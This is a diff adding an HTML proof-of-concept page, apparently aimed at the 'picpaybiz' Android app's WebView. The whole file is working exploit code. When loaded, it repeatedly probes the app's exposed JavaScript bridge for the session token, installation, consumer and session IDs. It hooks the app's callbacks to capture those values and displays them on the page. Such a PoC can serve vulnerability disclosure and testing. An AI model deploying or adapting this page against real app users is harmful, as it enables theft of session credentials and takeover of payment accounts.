@@ -1,0 +1,17 @@
+<!doctype html><html lang="pt"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PoC</title>
+<style>body{font:13px ui-monospace,monospace;background:#0f1115;color:#c9d1d9;padding:14px}h1{font:16px system-ui;color:#fff;margin:0 0 10px}.row{padding:4px 0;border-bottom:1px dashed #21262d}.k{color:#8b949e}.v{color:#7ee787;word-break:break-all}#log{color:#8b949e;font-size:12px}pre{white-space:pre-wrap;word-break:break-all}</style></head><body>
+<h1>picpaybiz WebView PoC</h1>
+<div class="row"><span class="k">origin: </span><span class="v" id="o"></span></div>
+<div class="row"><span class="k">Android: </span><span class="v" id="a"></span></div>
+<div class="row"><span class="k">TOKEN: </span><span class="v" id="t">(waiting…)</span></div>
+<pre id="log"></pre>
+<script>
+var S={},n=0,out=document.getElementById('log');function L(m){var d=document.createElement('div');d.textContent=(++n)+'. '+m;out.appendChild(d)}
+['setToken','setInstallationId','setConsumerId','setSessionId','setAppVersion','setDeviceOS'].forEach(function(k){window[k]=function(v){S[k]=v;document.getElementById('t').textContent=(k==='setToken')?v:document.getElementById('t').textContent;L('CALLBACK '+k+'='+v)}});
+function poke(){if(typeof Android==='undefined'){L('no Android bridge');return}
+['getToken','getInstallationId','getConsumerId','getSessionId','getAppVersion','getDeviceOS'].forEach(function(m){try{Android[m]()}catch(e){L(m+' err '+e)}})}
+document.getElementById('o').textContent=location.origin;
+document.getElementById('a').textContent=(typeof Android)+' ['+(function(){try{return Object.keys(Android).join(',')}catch(e){return '?'}})()+']';
+L('PAGE_LOADED '+location.href);
+setTimeout(poke,300);setTimeout(poke,1500);setTimeout(poke,3000);
+</script></body></html>
